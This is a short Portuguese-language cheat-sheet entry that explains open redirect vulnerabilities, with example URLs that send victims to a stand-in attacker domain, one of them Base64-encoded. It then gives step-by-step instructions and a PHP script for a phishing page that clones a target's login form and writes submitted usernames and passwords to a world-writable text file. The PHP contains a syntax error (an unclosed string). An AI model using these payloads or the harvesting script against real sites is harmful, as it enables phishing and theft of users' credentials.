# Open Redirect

É uma vulnerabilidade que explora o redirecionamento de páginas internas ou externas, tomando controle do parâmetro que realiza o redirecionamento, enviando a vítima para outra página.

`http://www.alvo.com.br/redir.php?url=http://hacker.com.br/`

Em alguns casos a aplicação pode utilizar o valor do parâmetro codificado. Nesses casos é necessário descobrir qual a codificação usada e codificar os payloads no mesmo formato.

Exemplo de payload codificado em Base64:
`http://www.alvo.com.br/redir.php?url=aHR0cDovL2hhY2tlci5jb20uYnIv`

## PoC em página com formulário

Salve a pagina do alvo que contém o forumlário utilizando a opção Salvar Como (Ctrl+S) do navegador.
Na sua máquina inicie um servidor web e copie os arquivos da página salva anteriormente na raíz do servidor.
Edite o formulário da página baixada para redirecionar a ação de enviar os dados para a página login.php que será criada logo abaixo. Também crie o arquivo senhas.txt na raíz do servidor com permissão total (777).
Crie o payload em PHP com o nome login.php que irá gravar os dados recebidos em um arquivo e redirecionar o usuário para a página verdadeira.
```
<?php

$caixa1 = $_POST["login"] . "\n";
$caixa2 = $_POST["senha"] . "\n";

$file = fopen("senhas.txt","a");

$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);

fclose($file);

header("Location: http://www.alvo.com.br/)

?>
```
